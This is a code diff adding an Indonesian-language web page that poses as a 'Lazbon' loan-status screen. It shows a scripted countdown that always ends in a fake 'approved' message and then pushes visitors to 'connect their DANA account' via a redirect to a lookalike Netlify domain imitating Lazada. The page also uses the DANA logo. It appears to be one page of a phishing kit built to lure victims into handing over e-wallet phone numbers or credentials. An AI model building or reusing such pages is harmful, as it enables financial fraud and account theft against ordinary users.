@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Status Pengajuan - Lazbon</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap');
+        body { font-family: 'Inter', sans-serif; background-color: #f8fafc; }
+        .laz-gradient { background: linear-gradient(180deg, #0044ff 0%, #0066ff 100%); }
+        .dana-gradient { background: linear-gradient(90deg, #118ee1 0%, #1081cf 100%); }
+        
+        .loader-ring {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0044ff;
+            border-radius: 50%;
+            width: 70px;
+            height: 70px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body class="antialiased">
+
+    <nav class="bg-white px-6 py-5 flex items-center justify-center sticky top-0 z-30 shadow-sm">
+        <h1 class="text-lg font-extrabold text-slate-800 tracking-tight">Status Pengajuan</h1>
+    </nav>
+
+    <main class="p-6">
+        <div class="bg-white rounded-[2.5rem] p-8 shadow-sm border border-slate-50 mb-8 text-center">
+            <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mb-2">Nominal Pengajuan</p>
+            <h2 id="finalAmount" class="text-4xl font-black text-slate-900 tracking-tighter">Rp 0</h2>
+            <div class="mt-4 inline-flex items-center gap-2 bg-blue-50 px-4 py-1.5 rounded-full">
+                <i class="fas fa-clock text-blue-600 text-[10px]"></i>
+                <span id="badgeStatus" class="text-[10px] font-bold text-blue-600 uppercase">Sedang Diverifikasi</span>
+            </div>
+        </div>
+
+        <div id="loadingSection" class="text-center py-10">
+            <div class="loader-ring mx-auto mb-8"></div>
+            <h3 class="text-xl font-bold text-slate-800 mb-3">Memverifikasi Data Anda</h3>
+            <p class="text-sm text-slate-400 px-10 mb-8">Sistem sedang meninjau kelayakan kredit Anda. Tunggu sekitar 5 menit.</p>
+            
+            <div class="bg-slate-100 rounded-2xl p-4 inline-block">
+                <p class="text-[10px] font-black text-slate-500 uppercase mb-1 tracking-widest">Estimasi Waktu Tunggu</p>
+                <p id="countdown" class="text-2xl font-mono font-bold text-blue-600">05:00</p>
+            </div>
+        </div>
+
+        <div id="successSection" class="hidden animate-in fade-in zoom-in duration-700 text-center py-5">
+            <div class="w-20 h-20 bg-emerald-100 text-emerald-500 rounded-full flex items-center justify-center mx-auto mb-8">
+                <i class="fas fa-check-double text-3xl"></i>
+            </div>
+            <h3 class="text-2xl font-black text-slate-800 mb-3 px-6">Pengajuan Pinjaman Lazbon Anda Berhasil!</h3>
+            <p class="text-sm text-slate-400 px-10 mb-10">Silakan hubungkan akun DANA Anda sebelum melakukan pencairan dana.</p>
+            
+            <button onclick="redirectToDana()" class="w-full dana-gradient text-white py-5 rounded-[1.5rem] font-black text-sm tracking-widest uppercase shadow-xl shadow-blue-200 animate-bounce">
+                Hubungkan Akun DANA
+            </button>
+        </div>
+    </main>
+
+    <div id="danaModal" class="hidden fixed inset-0 bg-slate-900/80 backdrop-blur-sm z-50 flex items-end sm:items-center justify-center">
+        <div class="bg-white w-full max-w-md rounded-t-[3rem] sm:rounded-[3rem] p-10">
+            <div class="w-12 h-1.5 bg-slate-200 rounded-full mx-auto mb-8"></div>
+            <div class="flex justify-center mb-6">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_danain.png/640px-Logo_danain.png" alt="DANA" class="h-8">
+            </div>
+            <h3 class="text-xl font-extrabold text-center text-slate-800 mb-2">Verifikasi DANA</h3>
+            <p class="text-center text-xs text-slate-400 mb-8">Hubungkan nomor DANA Anda untuk pencairan.</p>
+            
+            <button onclick="redirectToDana()" class="w-full dana-gradient text-white py-5 rounded-2xl font-extrabold text-sm tracking-widest uppercase shadow-xl mb-4">
+                LANJUTKAN KE DANA
+            </button>
+            <button onclick="closeDanaModal()" class="w-full text-slate-400 text-[10px] font-bold uppercase tracking-widest">Batal</button>
+        </div>
+    </div>
+
+    <script>
+        // Ambil nominal dari localStorage
+        window.onload = function() {
+            const savedLoan = localStorage.getItem('selectedLoan') || 5000000;
+            const formatIDR = (num) => "Rp " + new Intl.NumberFormat('id-ID').format(num);
+            document.getElementById('finalAmount').innerText = formatIDR(savedLoan);
+            
+            startTimer(300); // Set ke 300 untuk 5 menit
+        };
+
+        // Fungsi Redirect ke Netlify
+        function redirectToDana() {
+            window.location.href = "https://www-lazada-numberphone-input.netlify.app";
+        }
+
+        function startTimer(duration) {
+            let timer = duration, minutes, seconds;
+            const display = document.querySelector('#countdown');
+            const loadingSec = document.getElementById('loadingSection');
+            const successSec = document.getElementById('successSection');
+            const badgeStatus = document.getElementById('badgeStatus');
+
+            const interval = setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = minutes + ":" + seconds;
+
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    loadingSec.classList.add('hidden');
+                    successSec.classList.remove('hidden');
+                    badgeStatus.innerText = "Berhasil Disetujui";
+                    badgeStatus.classList.replace('text-blue-600', 'text-emerald-600');
+                    badgeStatus.parentElement.classList.replace('bg-blue-50', 'bg-emerald-50');
+                }
+            }, 1000);
+        }
+
+        function openDanaModal() { document.getElementById('danaModal').classList.remove('hidden'); }
+        function closeDanaModal() { document.getElementById('danaModal').classList.add('hidden'); }
+    </script>
+</body>
+</html>
